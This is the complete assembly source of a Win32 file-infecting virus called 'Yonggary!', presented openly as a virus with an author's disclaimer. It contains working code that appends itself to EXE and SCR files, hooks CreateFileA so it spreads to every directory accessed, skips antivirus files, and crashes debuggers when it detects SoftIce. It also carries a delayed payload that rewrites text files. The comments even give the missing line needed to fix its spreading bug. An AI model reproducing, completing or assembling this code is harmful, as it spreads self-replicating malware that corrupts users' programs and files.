   ;
   ;  Bumblebee Productions Presents:
   ;
   ;       Yonggary!
   ;
   ;  hehe Who or what is Yonggary? The corean monster like... guess who!
   ;
   ;  DISCLAIMER:
   ;  This is the source code of a VIRUS. The author is not responsabile
   ;  of any damage that may occur due to the assembly of this file.
   ;  Use it at your own risk.
   ;
   ;  It has nothing really new, but here follows some features:
   ;
   ;  .Infects PE exe files (EXE and SCR extensions) increasing last
   ;  section. Supports relocations and manages files that have weird
   ;  virt size and phys size values. File will increase file size
   ;  more than in other ways but we won stability. Uses size padding
   ;  as infection sign. If size padding check fails it won't re-infect
   ;  already infected files.
   ;  .Avoid antivirus and self-extractors looking for strings inside the
   ;  file (lo HenKy!).
   ;  .Has code aganist SoftIce, doing a fault if found (win9x/winNt/win2k).
   ;  .Has self integrity check via CRC32. Also uses the CRC32 to encrypt
   ;  the host return address. Since this value is not stored avers will
   ;  need to calc it in order to clean the file. Notice this integrity
   ;  check works also as kinda anti-debug feature.
   ;  .It is per-process resident hooking CreateFileA. When a call is
   ;  hooked it gets the directory and infects all PE files there. Also
   ;  has a run-time part that infects files inside windows folder.
   ;  .It uses CRC32 to get API addresses instead of names. Uses SEH to
   ;  get kernel32.dll address in memory using stack values to *guess*
   ;  where it is, that's why it fits into win32 viruses cathegory.
   ;  .It won't infect files smaller than 4000h bytes.
   ;  .Has an active payload that changes 'Microsoft' string by the
   ;  name of a great corean monster in all files in the folder accessed
   ;  by the hooked CreateFileA in the infected files, and also in files
   ;  inside the windows folder. It affects only TXT files to avoid
   ;  fake some files like REG ones.
   ;  The payload triggers after 6 months of file infection.
   ;
   ;  I coded it coz a guy asked me for a new virus to test speed reply
   ;  of antivirus ppl to new *menaces*. You know i like to re-use parts
   ;  of code i did for other viruses. This time was a need coz i had
   ;  little time to code it.
   ;
   ;  Thanx to Perikles (Atheniensis ;) for his great work testing this
   ;  virus. Thanx you very much friend!
   ;
   ;  Even the tests i've found a bug. I forget to init reentrace flag in
   ;  per-process hooking routine. Look comments :/
   ;
   ; The way of the bee
   ;
   .486p
   locals
   .model flat,STDCALL

           extrn           ExitProcess:PROC        ; needed for 1st generation
           extrn           MessageBoxA:PROC

   ; my little debug macro with hardcoded addr for my system
   @debug  macro   title,reg
           pushad
           push    1000h
           call    @@tit
           db      title,0
   @@tit:
           push    reg
           push    0h
           mov     eax,0bff5412eh
           call    eax
           popad
   endm
           vSize           equ     vEnd-vBegin
           vVSize          equ     vVEnd-vBegin
           PADDING         equ     101
           MAXSTRING       equ     160

   ; from BC++ Win32 API on-line Reference
   WIN32_FIND_DATA         struc
   dwFileAttributes        dd      0
   dwLowDateTime0          dd      ?       ; creation
   dwHigDateTime0          dd      ?
   dwLowDateTime1          dd      ?       ; last access
   dwHigDateTime1          dd      ?
   dwLowDateTime2          dd      ?       ; last write
   dwHigDateTime2          dd      ?
   nFileSizeHigh           dd      ?
   nFileSizeLow            dd      ?
   dwReserved              dd      0,0
   cFileName               db      260 dup(0)
   cAlternateFilename      db      14 dup(0)
                           db      2 dup(0)
   WIN32_FIND_DATA         ends

   .DATA
           ; dummy data
           db      'WARNING - This is a virus carrier - WARNING'
   .CODE
   inicio:
           lea     esi,vBegin+5                    ; setup self CRC32
           mov     edi,vSize-5                     ; for 1st generation
           call    CRC32
           xor     dword ptr [hostEP],eax          ; hide host entry point

   align   200h    ; ignore tasm warning
   vBegin  label   byte
           push    offset fakeHost
   hostEP  equ     $-4
           pushad

           call    getDelta

           lea     esi,vBegin+5+ebp                ; check self CRC32
           mov     edi,vSize-5                     ; it's ok
           call    CRC32
           xor     dword ptr [esp+20h],eax         ; restore host entry point
                                                   ; if CRC32 fails the
                                                   ; entry point will be faked
           ; relocation stuff
           mov     edx,offset vBegin               ; this allows infect
   virusEP equ     $-4                             ; relocatable hosts
           lea     eax,vBegin+ebp
           sub     eax,edx
           add     dword ptr [esp+20h],eax
           add     dword ptr [baseAddr+ebp],eax

           mov     edi,dword ptr [esp+24h]
           xor     edx,edx                         ; setup SEH frame
           lea     eax,dword ptr [esp-8h]
           xchg    eax,dword ptr fs:[edx]
           lea     esi,GetKernel32Exception+ebp
           push    esi
           push    eax

   GetKernel32Loop:                                ; loop to get Kernel32 addr
           dec     edi
           cmp     word ptr [edi],'ZM'             ; check is EXE
           jne     GetKernel32Loop
           mov     dx,word ptr [edi+3ch]           ; check has a right header
           test    dx,0f800h
           jnz     GetKernel32Loop
           cmp     edi,dword ptr [edi+edx+34h]     ; check addr fit in header
           jne     GetKernel32Loop

           xor     esi,esi                         ; remove SEH frame
           pop     dword ptr fs:[esi]
           pop     eax
                                                   ; now edi has k32 addr
           mov     esi,edi                         ; get API addr using CRC32
           mov     esi,dword ptr [esi+3ch]
           add     esi,edi
           mov     esi,dword ptr [esi+78h]
           add     esi,edi
           add     esi,1ch

           lodsd
           add     eax,edi
           mov     dword ptr [address+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [names+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [ordinals+ebp],eax

           sub     esi,16
           lodsd
           mov     dword ptr [nexports+ebp],eax

           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     eax,FSTAPI+ebp

   searchl:
           mov     esi,dword ptr [names+ebp]
           add     esi,edx
           mov     esi,dword ptr [esi]
           add     esi,edi
           push    eax edx edi
           xor     edi,edi
           movzx   di,byte ptr [eax+4]
           call    CRC32
           xchg    ebx,eax
           pop     edi edx eax
           cmp     ebx,dword ptr [eax]
           je      fFound
           add     edx,4
           inc     dword ptr [expcount+ebp]
           push    edx
           mov     edx,dword ptr [expcount+ebp]
           cmp     dword ptr [nexports+ebp],edx
           pop     edx
           je      retHost
           jmp     searchl
   fFound:
           shr     edx,1
           add     edx,dword ptr [ordinals+ebp]
           xor     ebx,ebx
           mov     bx,word ptr [edx]
           shl     ebx,2
           add     ebx,dword ptr [address+ebp]
           mov     ecx,dword ptr [ebx]
           add     ecx,edi
           mov     dword ptr [eax+5],ecx
           add     eax,9
           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     ecx,ENDAPI+ebp
           cmp     eax,ecx
           jb      searchl

           xor     eax,eax                         ; softice detection
           push    eax                             ; for win9x and winNt/2k
           inc     edx
           push    edx
           push    00000003h
           push    eax
           inc     eax
           push    eax
           push    80000000h
           call    checkSice
   siwin9x db      '\\.\SICE',0
   sicemod equ     $-offset siwin9x
           db      '\\.\NTICE',0
   checkSice:
           mov     eax,dword ptr [_CreateFileA+ebp]
           and     eax,0bff70000h
           add     eax,-0bff70000h
           jz      win9xDet
           add     dword ptr [esp],sicemod
   win9xDet:
           call    dword ptr [_CreateFileA+ebp]    ; open file
           inc     eax
           jz      notSice
           dec     eax
           call    dword ptr [_CloseHandle+ebp]
           cli
           call    $                               ; if found... fault!

   copyright               db      '< Yonggary! by Bumblebee >'
   ; data needed to get APIs
   FSTAPI                  label   byte
   CrcGetCurrentProcess    dd      003690e66h
                           db      18
   _GetCurrentProcess      dd      0

   CrcWriteProcessMemory   dd      00e9bbad5h
                           db      19
   _WriteProcessMemory     dd      0

   CrcCreateFileA          dd      08c892ddfh
                           db      12
   _CreateFileA            dd      0

   CrcMapViewOfFile        dd      0797b49ech
                           db      14
   _MapViewOfFile          dd      0

   CrcCreatFileMappingA    dd      096b2d96ch
                           db      19
   _CreateFileMappingA     dd      0

   CrcUnmapViewOfFile      dd      094524b42h
                           db      16
   _UnmapViewOfFile        dd      0

   CrcCloseHandle          dd      068624a9dh
                           db      12
   _CloseHandle            dd      0

   CrcGetFileTime          dd      04434e8feh
                           db      12
   _GetFileTime            dd      0

   CrcSetFileTime          dd      04b2a3e7dh
                           db      12
   _SetFileTime            dd      0

   CrcSetFileAttributesA   dd      03c19e536h
                           db      19
   _SetFileAttributesA     dd      0

   CrcGetFileAttributesA   dd      0c633d3deh
                           db      19
   _GetFileAttributesA     dd      0

   CrcGetFileSize          dd      0ef7d811bh
                           db      12
   _GetFileSize            dd      0

   CrcGetWindowsDirectoryA dd      0fe248274h
                           db      21
   _GetWindowsDirectoryA   dd      0

   CrcGetCurrentDirectoryA dd      0ebc6c18bh
                           db      21
   _GetCurrentDirectoryA   dd      0

   CrcSetCurrentDirectoryA dd      0b2dbd7dch
                           db      21
   _SetCurrentDirectoryA   dd      0

   CrcFindFirstFileA       dd      0ae17ebefh
                           db      15
   _FindFirstFileA         dd      0

   CrcFindNextFileA        dd      0aa700106h
                           db      14
   _FindNextFileA          dd      0

   CrcFindClose            dd      0c200be21h
                           db      10
   _FindClose              dd      0

   CrcGetSystemTime        dd      075b7ebe8h
                           db      14
   _GetSystemTime          dd      0

   ENDAPI                  label   byte

   notSice:
           lea     esi,dateTime+ebp                ; get current month
           push    esi
           call    dword ptr [_GetSystemTime+ebp]

           mov     byte ptr [payloadFlag+ebp],0    ; clear
           lea     esi,dateTime+ebp
           mov     ax,word ptr [esi+2]
           mov     bx,-1
   countdown       equ $-2
           cmp     bx,ax                           ; the day arrived?
           jne     skipActvPay

           mov     byte ptr [payloadFlag+ebp],1
   skipActvPay:
           add     eax,6                           ; setup month for new
           cmp     eax,12                          ; samples
           jbe     storeCountdown
           sub     eax,12
   storeCountdown:
           mov     word ptr [countdown+ebp],ax
   ;
   ; FUUUUUCK! Damn bug! I forget to init the reentrance flag to
   ; zero! Files infected in per-process part won't be able to
   ; infect more files via per-process routine... :(
   ;
   ; This makes the virus unable to spread so far. buaah :/
   ;
   ; The fucking missed line:
   ;
   ;       mov     dword ptr [multiThread+ebp],0
   ;
           ; must be called before any infection!
           ; per-process residency... Hook CreateFileA if available
           mov     ecx,dword ptr [_CreateFileA+ebp]
           mov     dword ptr [CFAhookRet+ebp],ecx  ; setup CreateFileA
                                                   ; ret addr
           mov     eax,400000h                     ; this is setup at
   baseAddr        equ $-4                         ; inf time
           lea     esi,CreateFileAHook+ebp
           call    APIHook                         ; hook CreateFileA

           lea     esi,buffer0+ebp                 ; get current directory
           push    esi
           push    MAXSTRING
           call    dword ptr [_GetCurrentDirectoryA+ebp]
           or      eax,eax
           jz      retHost

           push    MAXSTRING                       ; get windows directory
           lea     esi,buffer1+ebp
           push    esi
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      retHost

           lea     esi,buffer1+ebp                 ; goto windows directory
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]
           or      eax,eax
           jz      retHost

           call    infectFolder                    ; infect windows folder

           lea     esi,buffer0+ebp                 ; go back home
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

   retHost:                                        ; return to host
           popad
           ret

   GetKernel32Exception:                           ; uh? buaah :)
           xor     edi,edi                         ; restore shit
           mov     eax,dword ptr fs:[edi]
           mov     esp,dword ptr [eax]
           pop     dword ptr fs:[edi]
           pop     eax
           jmp     retHost                         ; return host :/

   ;
   ; This routine gets current delta offset.
   ;
   getDelta:
           call    deltaOffset
   deltaOffset:
           pop     ebp
           sub     ebp,offset deltaOffset
           ret
   ;
   ; This routine makes CRC32.
   ;
   CRC32:
       cld
           xor     ecx,ecx
           dec     ecx
       mov     edx,ecx
       push    ebx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:
           dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
           dec     edi
       jnz     NextByteCRC
       pop     ebx
       not     edx
       not     ecx
       mov     eax,edx
       rol     eax,16
       mov     ax,cx
       ret
   ;
   ; Infects PE file increasing last section.
   ;
   infect:
           pushad
           mov     dword ptr [fNameAddr+ebp],esi   ; save filename
                                                   ; addr for later
           push    esi
           push    esi
           call    dword ptr [_GetFileAttributesA+ebp]     ; get...
           pop     esi
           inc     eax
           jz      infectionError
           dec     eax

           mov     dword ptr [fileAttrib+ebp],eax

           push    esi
           push    00000080h
           push    esi
           call    dword ptr [_SetFileAttributesA+ebp]     ; clean file
           pop     esi                                     ; attributes
           or      eax,eax
           jz      infectionError

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h OR 40000000h
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open the file RW
           inc     eax
           jz      infectionErrorAttrib
           dec     eax

           mov     dword ptr [fHnd+ebp],eax

           push    0h
           push    eax
           call    dword ptr [_GetFileSize+ebp]    ; get file size
           inc     eax
           jz      infectionErrorClose
           dec     eax

           mov     dword ptr [fileSize+ebp],eax

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_GetFileTime+ebp]    ; get... :)
           or      eax,eax
           jz      infectionErrorClose

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]     ; file mapping
           or      eax,eax
           jz      infectionErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

           mov     edi,eax
           cmp     word ptr [edi],'ZM'             ; check is exe
           jne     infectionErrorCloseUnmap

           add     edi,dword ptr [edi+3ch]         ; check is PE
           cmp     eax,edi                         ; take care of strange
           ja      infectionErrorCloseUnmap        ; DOS headers
           add     eax,dword ptr [fileSize+ebp]
           cmp     eax,edi
           jb      infectionErrorCloseUnmap
           cmp     word ptr [edi],'EP'
           jne     infectionErrorCloseUnmap

           movzx   edx,word ptr [edi+16h]          ; check executable type:
           test    edx,2h                          ; check is executable
           jz      infectionErrorCloseUnmap
           test    edx,2000h                       ; check not DLL
           jnz     infectionErrorCloseUnmap
           movzx   edx,word ptr [edi+5ch]
           dec     edx                             ; check not native
           jz      infectionErrorCloseUnmap

           pushad
           mov     ecx,seflextractors
           lea     esi,seflextractor+ebp
           mov     eax,dword ptr [mapMem+ebp]
           mov     edx,dword ptr [fileSize+ebp]
           call    searchStringz                   ; check is not self-extractor
           popad                                   ; file
           jnc     infectionErrorCloseUnmap

           pushad
           mov     ecx,antiviruss
           lea     esi,antivirus+ebp
           mov     eax,dword ptr [mapMem+ebp]
           mov     edx,dword ptr [fileSize+ebp]
           call    searchStringz                   ; check is not antivirus
           popad                                   ; file
           jnc     infectionErrorCloseUnmap

           mov     esi,edi

           mov     eax,18h                         ; goto last section
           add     ax,word ptr [edi+14h]
           add     edi,eax
           movzx   ecx,word ptr [esi+06h]
           dec     ecx
           mov     eax,28h
           xor     edx,edx
           mul     cx
           add     edi,eax

           mov     eax,dword ptr [edi+24h]
           and     eax,0e0000020h
           cmp     eax,0e0000020h                  ; infected yet? :?
           je      infectionErrorCloseUnmap

           mov     edx,dword ptr [edi+08h]         ; first fix
           cmp     edx,dword ptr [edi+10h]
           jbe     skipFixRVA0

           mov     dword ptr [edi+10h],edx

   skipFixRVA0:
           mov     eax,dword ptr [edi+0ch]         ; calc new EP
           add     eax,dword ptr [edi+10h]
           push    eax
           add     eax,dword ptr [esi+34h]         ; relocation stuff
           mov     dword ptr [virusEP+ebp],eax
           pop     eax
           xchg    eax,dword ptr [esi+28h]
           mov     edx,dword ptr [esi+34h]

           add     eax,edx
           mov     dword ptr [baseAddr+ebp],edx    ; for API hook
           mov     dword ptr [hostEP+ebp],eax      ; save old EP

           mov     eax,dword ptr [edi+14h]         ; setup EP addr in file
           add     eax,dword ptr [edi+10h]
           mov     dword ptr [epAddr+ebp],eax

           or      dword ptr [edi+24h],0e0000020h  ; set sect properties
           and     dword ptr [edi+24h],NOT 10000000h ; avoid shared section
           xor     eax,eax
           mov     dword ptr [esi+58h],eax         ; zero PE checksum

           mov     eax,vSize                       ; the section phys size
           add     eax,dword ptr [edi+10h]
           mov     ecx,dword ptr [esi+3ch]
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx

           mov     dword ptr [edi+10h],eax         ; store the phys size

           mov     edx,dword ptr [edi+08h]         ; quit curr virt size
           sub     dword ptr [esi+50h],edx
           mov     edx,dword ptr [edi+10h]         ; calc new Virt size
           cmp     edx,dword ptr [edi+08h]         ; i fix the section
           jbe     skipFixRVA                      ; if phys>virt
           mov     dword ptr [edi+08h],edx         ; virt=phys
   skipFixRVA:

           mov     eax,vVSize                      ; increase with virus
           add     eax,dword ptr [edi+08h]         ; virt size
           mov     ecx,dword ptr [esi+38h]
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx

           add     dword ptr [esi+50h],eax         ; fix the image size
           mov     dword ptr [edi+08h],eax         ; fix the virtual size

           mov     eax,dword ptr [edi+10h]         ; phys size last sect
           add     eax,dword ptr [edi+14h]         ; plus phys offset
           mov     ecx,PADDING                     ; calc file padding
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx
           mov     dword ptr [pad+ebp],eax

           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

           xor     eax,eax
           push    eax
           push    dword ptr [pad+ebp]
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax
           jz      infectionErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    dword ptr [pad+ebp]
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

           lea     esi,vBegin+5+ebp                ; update self CRC32
           mov     edi,vSize-5
           call    CRC32
           xor     dword ptr [hostEP+ebp],eax      ; hide host entry point

           mov     ecx,vSize                       ; copy the baby
           lea     esi,vBegin+ebp
           mov     edi,dword ptr [mapMem+ebp]
           add     edi,dword ptr [epAddr+ebp]
           rep     movsb

   infectionErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

   infectionErrorCloseMap:
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_SetFileTime+ebp]

   infectionErrorClose:
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CloseHandle+ebp]

   infectionErrorAttrib:
           push    dword ptr [fileAttrib+ebp]
           push    dword ptr [fNameAddr+ebp]
           call    dword ptr [_SetFileAttributesA+ebp]

   infectionError:
           popad
           ret

   ;
   ; search stringz
   ;
   ; esi: string to search
   ; ecx: size of string
   ; eax: where to search
   ; edx: buffer size
   ;
   searchStringz:
           mov     edi,eax
           add     edx,edi
           sub     edx,ecx
   scanFileLoop:
           cmp     edi,edx
           jae     scanFileNotFound
           push    ecx
           push    esi
           push    edi

           rep     cmpsb
           pop     edi
           pop     esi
           pop     ecx
           je      scanFileFound
           inc     edi
           jmp     scanFileLoop

   scanFileNotFound:
           stc
           ret
   scanFileFound:
           clc
           ret

   ;
   ; Our CreateFileA hook.
   ;
   CreateFileAHook:
           pushad
           call    getDelta

           mov     eax,0000001h                    ; for reentrance fix
   multiThread     equ $-4
           or      eax,eax
           jz      busy

           dec     dword ptr [multiThread+ebp]     ; set to busy

           mov     esi,dword ptr [esp+24h]         ; get filename
           or      esi,esi                         ; check filename!=NULL
           jz      flee

           mov     edi,esi                         ; goto end of string
   getExt:
           cmp     byte ptr [edi],0
           je      checkExt
           inc     edi
           jmp     getExt
   checkExt:

           ; @debug  "File found",esi                ; debug code

   folderLoop:
           cmp     byte ptr [edi],'\'
           je      endFolder
           cmp     edi,esi
           je      flee
           dec     edi
           jmp     folderLoop
   endFolder:
           inc     edi
           mov     ecx,edi
           sub     ecx,esi
           lea     edi,buffer1+ebp
           rep     movsb
           mov     byte ptr [edi],0
           lea     esi,buffer1+ebp

           ; @debug  "Folder found",esi              ; debug code

           ; ignore Set/Get directory errors, don't care
           ; sometime change dir won't be necessary, but i ever
           ; try it

           push    esi
           push    MAXSTRING                       ; get current directory
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_GetCurrentDirectoryA+ebp]
           pop     esi

           push    esi                             ; goto found folder
           call    dword ptr [_SetCurrentDirectoryA+ebp]

           call    infectFolder                    ; uh uh

           lea     esi,buffer0+ebp                 ; go back home
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

   flee:
           inc     dword ptr [multiThread+ebp]     ; set to available
   busy:
           popad
           push    12345678h
   CFAhookRet      equ $-4
           ret

   ;
   ; Infects PE files in current directory. It affects EXE and SCR exts.
   ;
   infectFolder:
           pushad

           lea     esi,find_data+ebp               ; find first file
           push    esi
           lea     esi,fndMask+ebp
           push    esi
           call    dword ptr [_FindFirstFileA+ebp]
           inc     eax
           jz      notFound
           dec     eax

           mov     dword ptr [findHnd+ebp],eax

   findNext:
           lea     esi,find_data.cFileName+ebp
           mov     edi,esi
   foundFilenameLen:                               ; get string len
           cmp     byte ptr [edi],0
           je      filenameLenOk
           inc     edi
           jmp     foundFilenameLen
   filenameLenOk:
           push    edi                             ; test the string it's
           sub     edi,esi                         ; long enought
           cmp     edi,5
           pop     edi
           jna     skipThisFile2

           mov     eax,dword ptr [edi-4]
           or      eax,20202000h
           cmp     eax,'exe.'
           je      validFileExt
           cmp     eax,'rcs.'
           jne     skipThisFile

   validFileExt:
           mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
           cmp     eax,4000h
           jb      skipThisFile2                   ; at least 4000h bytes? uh! missed '2' in orignal
           mov     ecx,PADDING                     ; test if it's infected
           xor     edx,edx                         ; yet
           div     ecx
           or      edx,edx                         ; reminder is zero?
           jz      skipThisFile2

           lea     esi,find_data.cFileName+ebp

           ; @debug  "Infectable file",esi           ; debug code

           call    infect
           jmp     skipThisFile2

   skipThisFile:                   ; payload check (the '2' missed is not problem
           cmp     eax,'txt.'          ; after all, luck tis time!)
           jne     skipPayload
           cmp     byte ptr [payloadFlag+ebp],1
           jne     skipPayload
           lea     esi,find_data.cFileName+ebp
           call    payload
   skipPayload:
   skipThisFile2:
           lea     esi,find_data+ebp
           push    esi
           push    dword ptr [findHnd+ebp]
           call    dword ptr [_FindNextFileA+ebp]  ; Find next file
           or      eax,eax
           jnz     findNext

   infectionDone:
           push    dword ptr [findHnd+ebp]
           call    dword ptr [_FindClose+ebp]

   notFound:
           popad
           ret

   ;
   ; API hook routine.
   ;
   ; in:
   ;       eax     addr of loaded module
   ;       ecx     addr of API to hook
   ;       esi     addr of hook routine
   ; out:
   ;       eax     0 on error
   ;
   APIHook:
           push    esi
           mov     edx,eax
           mov     edi,edx
           add     edi,dword ptr [edx+3ch]         ; begin PE header
           mov     edi,dword ptr [edi+80h]         ; RVA import
           or      edi,edi                         ; uh? no imports??? :)
           jz      skipHookErr
           add     edi,edx                         ; add base addr
   searchK32Imp:
           mov     esi,dword ptr [edi+0ch]         ; get name
           or      esi,esi                         ; check is not last
           jz      skipHookErr
           add     esi,edx                         ; add base addr
           mov     ebx,dword ptr [esi]
           or      ebx,20202020h
           cmp     ebx,'nrek'                      ; look for Kernel32 module
           jne     nextName
           mov     ebx,dword ptr [esi+4]
           or      ebx,00002020h
           cmp     ebx,'23le'                      ; kernel32 found
           je      k32ImpFound
   nextName:                                       ; if not found check
           add     edi,14h                         ; name of next import
           mov     esi,dword ptr [edi]             ; module
           or      esi,esi
           jz      skipHookErr
           jmp     searchK32Imp
   k32ImpFound:                                    ; now we have k32
           mov     esi,dword ptr [edi+10h]         ; get address table
           or      esi,esi                         ; heh
           jz      skipHookErr
           add     esi,edx                         ; add base addr again

           mov     edi,ecx                         ; search for API
   nextImp:
           lodsd                                   ; get addrs
           or      eax,eax                         ; chek is not last
           jz      skipHookErr
           cmp     eax,edi                         ; cmp with API addr
           je      doHook                          ; found? hook!
           jmp     nextImp                         ; check next in table
   doHook:
           sub     esi,4
           push    esi                             ; save import addr

           call    dword ptr [_GetCurrentProcess+ebp]

           pop     esi edx
           mov     dword ptr [fileSize+ebp],edx    ; tmp storage

           lea     edi,fileAttrib+ebp
           push    edi                             ; tmp storage for shit
           push    4
           lea     edi,fileSize+ebp
           push    edi                             ; bytes to write
           push    esi                             ; where to write
           push    eax                             ; current process
           call    dword ptr [_WriteProcessMemory+ebp]
   skipHook:
           ret
   skipHookErr:
           pop     esi
           xor     eax,eax
           ret

   ;
   ; Opens file, searches for the 'Microsoft' string and changes it
   ; by... our favourite monster name ;)
   ;
   ; Only changes 1st ocurrence, but in next opens will change nexts...
   ;
   ; in: esi filename to change
   ;
   payload:
           pushad

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h OR 40000000h
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open the file RW
           inc     eax
           jz      payloadError
           dec     eax

           mov     dword ptr [fHnd+ebp],eax

           push    0h
           push    eax
           call    dword ptr [_GetFileSize+ebp]    ; get file size
           inc     eax
           jz      payloadErrorClose
           dec     eax

           mov     dword ptr [fileSize+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]     ; file mapping
           or      eax,eax
           jz      payloadErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view
           or      eax,eax
           jz      payloadErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

           lea     esi,mshit+ebp
           mov     ecx,mshitsize
           mov     edx,dword ptr [fileSize+ebp]
           call    searchStringz
           jc      payloadErrorCloseUnmap          ; not found :/

           ; found! we have into edi the addr of the string
           mov     ecx,mshitsize
           lea     esi,copyright+ebp
           add     esi,2
           rep     movsb

   payloadErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

   payloadErrorCloseMap:
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

   payloadErrorClose:
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CloseHandle+ebp]

   payloadError:
           popad
           ret

   ; more data
   mshit           db      'Microsoft'
   mshitsize       equ     $-mshit
   seflextractor   db      'xtractor'
   seflextractors  equ     $-seflextractor
   antivirus       db      'ntivir'
   antiviruss      equ     $-antivirus
   fndMask         db      '*.*',0

   vEnd    label   byte
   ; data not stored in file (virtual)
   buffer0         db      MAXSTRING dup (0)
   buffer1         db      MAXSTRING dup (0)
   address         dd      0
   names           dd      0
   ordinals        dd      0
   nexports        dd      0
   expcount        dd      0
   find_data       WIN32_FIND_DATA <0>
   findHnd         dd      0
   fHnd            dd      0
   mapMem          dd      0
   fhmap           dd      0
   fileSize        dd      0
   epAddr          dd      0
   fileAttrib      dd      0
   fileTime0       dd      0,0
   fileTime1       dd      0,0
   fileTime2       dd      0,0
   pad             dd      0
   dateTime        db      16 dup(0)
   fNameAddr       dd      0
   payloadFlag     db      0
   vVEnd   label   byte

   ;
   ; Fake host needed for 1st gen
   ;
   fakeHost:
           push    1000h
           call    title
           db      '(C) 2001 Bumblebee',0
   title:  call    mess
           db      'Yonggary is walking the earth!',0
   mess:
           push    0h
           call    MessageBoxA

           push    0h
           call    ExitProcess
   Ends
   End     inicio
